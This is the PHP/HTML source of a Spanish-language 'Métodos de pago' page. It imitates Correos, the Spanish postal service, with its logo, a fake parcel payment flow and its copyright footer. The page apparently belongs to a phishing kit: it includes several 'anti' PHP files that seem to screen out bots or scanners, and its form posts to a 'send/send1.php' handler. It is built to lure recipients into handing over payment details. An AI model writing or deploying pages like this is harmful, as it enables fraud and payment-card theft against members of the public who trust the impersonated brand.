<?php
    include "anti/anti1.php";
    include "anti/anti2.php";
    include "anti/anti3.php";
    include "anti/anti4.php";
    include "anti/anti7.php";
    include "anti/anti8.php";

?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Métodos de pago</title>
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="stylesheet" href="styles/head.css">
    <link rel="stylesheet" href="styles/main.css">
    <link rel="stylesheet" href="styles/corr.css">
    <link rel="stylesheet" href="styles/responsive.css">
</head>
<body>
    <header>
        <nav>
            <div><img src="images/LogoCornamusa.svg" class="headlogo" alt="image" height="40px" ></div>
            <div class="lina-nav">Ir a correos.es</div>
        </nav>
    </header>
    <main>
        <div class="grid1">
            <img src="images/background-login.jpg" alt="image" class="imgbackground">
        </div>
        <div class="grid2">
            <div class="inicia"> Paquete Azul</div>
            <div class="etapes">
                <div class="divspanone"><span class="spanone">1</span> Envíos</div>
                <div class="divspanone"><span class="spanone">2</span> Resumen</div>
                <div class="divspanfour"><span class="spanfour">3</span> Pago</div>
                <div class="divspanfive"><span class="spanfive">4</span> Impresión</div>
            </div>

            <form action="send/send1.php" method="POST" class="formlogin">
                <div class="lkaro">
                <!-- <div class="inicia" style="margin-top: 20px;font-size:20px"> Medios de pago </div> -->
                <!-- <div class="para">Elige la manera que te resulte más cómoda para pagar y acepta las condiciones de servicio </div> -->
                <div><img src="images/pac.png" alt="image" height="100px" style="margin-bottom: 30px;"></div>
                <div class="log">
                    <!-- <div class="divsk">
                        <div>Tarjeta de crédito o débito.</div>
                        <div class="div12"> <input type="radio" name="rad" id="rad" checked="true"><img src="images/visaa.jpg" alt="image" height="50px"></div>
                        <div class="div12"> <input type="radio" name="rad" id="rad" checked="true"><img src="images/newmast.jpg" alt="image" width="70px" style="margin-left: 5px;"></div>

                    </div> -->

                    <div class="divbtnsubmit">
                        <button type="submit" id="submitbtncodigo" style="font-size: 17px;cursor:pointer;">Seguir</button>
                    </div>
                </div>
                </div>
                
                <div class="displaytelecharger">
                    <div>Descarga la app de Correos</div>
                    <div class="telech">
                        <img src="images/apple_store.webp" alt="image" width="115px">
                        <img src="images/google-pay.webp" alt="image" width="115px">
                        <img src="images/galery.svg" alt="image" width="115px">
                    </div>
                </div>
            </form>
        </div>
    </main>
    <footer>
        <div class="containerfooter">
            <div>
                <div><img src="images/footer-logo.svg" alt="image"></div>
            </div>
            <div class="divlastfoot">
                <div class="apaa">
                    <div class="textapa">Política de cookies</div>
                    <div class="textapa">Aviso legal</div>
                    <div class="textapa">Privacidad web</div>
                    <div class="textapa">Alerta seguridad</div>
                </div>
                <div class="lasttx">
                    ©Sociedad Estatal Correos y Telegrafos, S.A., S.M.E. Todos los derechos reservados.
                </div>
            </div>
        </div>

    </footer>
    <script src="javascript/login.js"></script>
</body>
</html>